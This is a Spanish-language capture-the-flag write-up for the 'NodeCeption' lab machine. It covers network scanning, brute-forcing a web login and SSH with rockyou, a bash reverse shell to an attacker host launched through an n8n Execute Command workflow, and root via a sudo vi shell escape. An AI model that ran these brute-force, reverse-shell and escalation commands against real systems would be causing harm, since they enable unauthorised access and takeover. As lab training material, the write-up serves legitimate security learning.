# NodeCeption | TheHackersLabs
## 📡 Reconocimiento
### 🌐 Descubrimiento de red
Realicé un escaneo ARP para identificar los dispositivos en la red:
```bash
sudo arp-scan -I eth0 --localnet
```
Se identificó el host 192.168.1.115.
```bash
ping -c 1 192.168.1.115
```
La máquina respondió correctamente, confirmando que estaba activa.

### 🔍 Escaneo de puertos y servicios
Se ejecutó un escaneo masivo con Nmap:
```bash
nmap -p- --open -sS -sC -sV --min-rate=5000 -Pn -n 192.168.1.115 -oN escaneo.txt
```
Puertos abiertos:
- 22/tcp → OpenSSH 9.6p1
- 5678/tcp → Servicio HTTP (n8n)
- 8765/tcp → Apache 2.4.58

## 🔢 Enumeración
### 🌐 Enumeración del servidor web
Al acceder a http://192.168.1.115:8765, se visualizó la página por defecto de Apache.

En el código fuente HTML se encontró este comentario:
```text
usuario@maildelctf.com
Espero que hayas cambiado la contraseña como se te indicó.
Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula.
```

Se sospecha de un login oculto → se usó Gobuster:
```bash
gobuster dir -u http://192.168.1.115:8765 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt
```
Resultado:
/login.php (Status: 200)

### 🕵️ Fuerza bruta HTTP
La interfaz de login solicita correo + contraseña. Se utilizó Burp Suite para capturar la petición y luego:
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST \
 -d "email=usuario@maildelctf.com&password=FUZZ" \
 -u http://192.168.1.115:8765/login.php \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -mc all -fs 1808
```
Credenciales válidas encontradas:
```text
usuario@maildelctf.com : Password1
```
Acceso exitoso al panel.

## 💥 Explotación
### 📦 Acceso al panel n8n
Con las mismas credenciales accedimos a http://192.168.1.115:5678, el panel de n8n.

Se creó un workflow malicioso con un nodo Execute Command que lanzó una reverse shell:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.109/4444 0>&1'
```
En el atacante:
```bash
nc -nlvp 4444
```
Resultado: shell como thl.

🐚 Reverse Shell
Se ejecutó manualmente el workflow desde la interfaz.

En el equipo atacante se obtuvo una reverse shell como usuario thl.

## 🧗 Escalada de Privilegios
### 🔐 Sudo -l
```text
(ALL) NOPASSWD: /usr/bin/vi
(ALL : ALL) ALL
```

### 🔐 Intento de Escalada con sudo vi
Se intentó ejecutar:
```bash
sudo /usr/bin/vi
```
Pero pedía contraseña a pesar del NOPASSWD, probablemente por interferencia del segundo sudo rule.

### 🧨 Fuerza bruta con Hydra
Se usó hydra para forzar el acceso por SSH:
```bash
hydra -l thl -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.115 -vvv
```
Resultado:
```text
login: thl
password: basketball
```

### 🔼 Escalada de Privilegios (root)
Ahora con TTY funcional (por SSH directo) se ejecutó:
```bash
sudo vi -c ':!/bin/sh' /dev/null
```
Resultado:
```text
# whoami
root
```

## 🏁 Post Escalada
- Se accedió al sistema con permisos de root.
- Se localizaron y leyeron flags finales.
